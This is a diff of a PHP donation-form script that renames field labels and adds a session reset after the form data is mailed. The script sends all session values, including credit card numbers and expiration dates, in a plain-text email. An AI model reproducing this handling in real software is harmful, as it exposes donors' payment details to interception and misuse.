@@ -9,7 +9,7 @@ $nameAttr = Array(
     'txtSpouse' => 'step 1 : Spouse Name - if applicable',
     'txtOrganization' => 'step 1 : Organization',
     'txtTitle' => 'step 1 : Title',
-    'strWorkAddr' => 'step 1 :  Check if this is a work address',
+    'strWorkAddrRef' => 'step 1 :  Check if this is a work address',
     'txtAddress1' => 'step 1 : Street',
     'txtAddress2' => 'step 1 : Street 2',
     'txtCity' => 'step 1 : City ',
@@ -31,7 +31,7 @@ $nameAttr = Array(
     'txtSpouse2' => 'step 2 : Spouse Name - (if applicable)',
     'txtOrganization2' => 'step 2 : Organization',
     'txtTitle2' => 'step 2 :  Title',
-    'strWorkAddr2' => 'step 2 :  Check if this is a work address',
+    'strWorkAddr2Ref' => 'step 2 :  Check if this is a work address',
     'txtAddress12' => 'step 2 : Street',
     'txtAddress22' => 'step 2 : Street 2',
     'txtCity2' => 'step 2 : City',
@@ -54,7 +54,7 @@ $nameAttr = Array(
     'txtCardNumber' => 'step 2 : Card Number',
     'cboCardMonth' => 'step 2 : Expiration Month ',
     'cboCardYear' => 'step 2 : Expiration Year ',
-    'txtCCChkAddress' => 'step 2 : Check this box if the credit card billing address is the same as previously entered. If not, please complete the below ',
+    'txtCCChkAddressRef' => 'step 2 : Check this box if the credit card billing address is the same as previously entered. If not, please complete the below ',
     'txtCCFirstName' => 'step 2 : First Name ',
     'txtCCLastName' => 'step 2 : Last Name',
     'txtCCAddress1' => 'step 2 : Street',
@@ -66,7 +66,7 @@ $nameAttr = Array(
     'txtCardNumber2' => 'step 3 : Entered Donation Amount ',
     'cboCardMonth2' => 'step 3 : Expiration Month ',
     'cboCardYear2' => 'step 3 : Expiration Year',
-    'txtCCChkAddress' => 'step 3 : Check this box if the credit card billing address is the same as previously entered. If not, please complete the below',
+    'txtCCChkAddress2' => 'step 3 : Check this box if the credit card billing address is the same as previously entered. If not, please complete the below',
     'txtCCFirstName2' => 'step 3 : First Name',
     'txtCCLastName2' => 'step 3 : Last Name',
     'txtCCAddress12' => 'step 3 : Street ',
@@ -89,7 +89,7 @@ foreach ($_SESSION as $key => $value) {
         }
     } else {
         $cuerpo.= "---------------------------------------------------\r\n ";
-        $cuerpo.="[" . $nameAttr[$key] . " : ] \r\n";
+        $cuerpo.="[" . $nameAttr[$key] . "] \r\n";
         $cuerpo.= $value . " \r\n";
     }
 }
@@ -98,6 +98,7 @@ $headers = "MIME-Version: 1.0\r\n";
 $headers .= "From: NIAF <noreply@mommyhotspot.com>\r\n";
 if (mail($destinatario, $asunto, $cuerpo, $headers)) {
     echo '<h1>Tahnk..</h1>';
+    session_destroy();
 } else {
     ?>
     <script type="text/javascript">
